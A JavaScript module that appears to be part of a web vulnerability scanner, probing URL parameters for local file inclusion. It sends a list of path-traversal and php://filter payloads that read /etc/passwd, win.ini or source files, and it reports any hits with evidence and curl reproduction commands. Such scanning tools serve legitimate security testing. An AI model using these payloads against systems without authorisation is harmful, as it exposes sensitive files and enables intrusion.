import axios from 'axios';

export class LFIDetector {
  constructor() {
    this.payloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      'file:///etc/passwd',
      '/etc/passwd',
      'C:\\windows\\win.ini',
      '../../../../../../../etc/passwd',
      '../../../../../../../../../../etc/passwd%00',
      'php://filter/convert.base64-encode/resource=index.php'
    ];
  }

  async detect(endpoint) {
    const vulnerabilities = [];
    if (!endpoint.parameters) return vulnerabilities;

    for (const param of endpoint.parameters) {
      for (const payload of this.payloads) {
        try {
          const testUrl = this.buildTestUrl(endpoint.url, param, payload);
          const response = await axios.get(testUrl, {
            timeout: 5000,
            validateStatus: () => true
          });

          if (this.isVulnerable(response.data)) {
            vulnerabilities.push({
              type: 'LFI',
              severity: 'HIGH',
              url: testUrl,
              parameter: param,
              payload: payload,
              evidence: response.data.toString().substring(0, 500),
              description: `Local File Inclusion (LFI) vulnerability in '${param}'`,
              impact: 'Access to sensitive files, source code disclosure, potential remote code execution',
              remediation: 'Use allowlists for file access, avoid user input in file paths, implement proper access controls',
              cwe: 'CWE-22',
              owasp: 'A01:2021 – Broken Access Control',
              reproductionSteps: [
                `1. Navigate to: ${testUrl}`,
                `2. Check response for file contents`,
                `3. Look for /etc/passwd or win.ini content`
              ],
              curlCommand: `curl -X GET "${testUrl}"`
            });
            break;
          }
        } catch (error) {}
      }
    }
    return vulnerabilities;
  }

  buildTestUrl(baseUrl, param, payload) {
    const url = new URL(baseUrl);
    url.searchParams.set(param, payload);
    return url.toString();
  }

  isVulnerable(data) {
    const dataStr = data.toString();
    return /root:x:0:0|daemon:|bin:|sys:/i.test(dataStr) ||
           /\[extensions\]|\[fonts\]/i.test(dataStr);
  }
}
